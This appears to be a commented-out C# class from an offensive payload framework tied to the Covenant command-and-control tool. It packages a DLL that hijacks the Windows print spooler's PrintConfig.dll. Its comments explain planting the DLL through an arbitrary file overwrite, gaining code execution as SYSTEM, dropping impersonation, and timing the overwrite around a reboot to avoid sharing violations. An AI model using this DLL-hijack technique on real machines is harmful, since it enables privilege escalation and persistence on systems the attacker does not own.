/*using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Diagnostics;

using Tonsil.Files;

using Covenant.Models.Launchers;

namespace MyWarez.Payloads
{
    // Loads PrintConfig.dll from paths similar to:
    // C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_d953309ec763fcc7\Amd64\PrintConfig.dll
    // C:\windows\System32\DriverStore\FileRepository\prnms003.inf_x86_5b0184fdd4027e3f\I386\PrintConfig.dll
    // No exported functions of PrintConfig.dll will be called

    // Notes:
    // Can't use if spoolv.exe has already loaded PrintConfig.dll due to sharing violation
    // Don't know under what conditions spoolv.exe loads the dll (except at print start)
    // In EPPv1 lane, spoolv.exe loads it within 10 minutes after boot ... Don't rememeber that being the case previously.
    // So would need to be pair with a method to get code exec shortly after reboot
    // TODO: remove print diaglog box. Comes at a cost of running payload is Local Service under impersonation? https://decoder.cloud/2019/11/13/from-arbitrary-file-overwrite-to-system/
    // Since we have code exec in SYSTEM process, you can just remove the impersonation to get back to SYSTEM
    // Wait looks like its a different process and not spoolv.exe anymore? Might be useful for getting around sharing violation without a persistence mech (to overwrite file right after reboot) 

    // Exports: void LoadDll();
    public class PrintConfigLoader : DynamicDynamicLinkLibrary
    {
        public PrintConfigLoader() : base(Constants.DynamicFilePayloadDirectory + "DynamicLinkLibrary" + Path.DirectorySeparatorChar + typeof(PrintConfigLoader).Name) { }
        public override string Name { get; } = "PrintConfigLoader";
    }
}
*/